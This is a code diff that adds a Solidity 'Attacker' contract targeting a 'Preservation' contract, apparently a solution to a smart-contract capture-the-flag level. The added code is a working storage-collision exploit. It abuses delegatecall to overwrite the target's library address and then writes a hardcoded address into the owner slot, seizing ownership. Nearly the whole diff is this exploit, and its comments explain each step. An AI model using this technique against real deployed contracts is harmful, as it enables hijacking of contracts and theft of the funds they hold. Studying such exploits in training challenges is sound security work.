@@ -43,3 +43,19 @@ contract LibraryContract {
         storedTime = _time;
     }
 }
+
+contract Attacker {
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+
+    function attack(Preservation preservation) external {
+        // timeZone1Library will be this address after this call
+        preservation.setFirstTime(uint256(uint160(address(this))));
+    }
+
+    function setTime(uint _time) external {
+        // this will change the target contracts owner storage variable owner to my address
+        owner = address(0xe4064d8E292DCD971514972415664765e51B5364);
+    }
+}
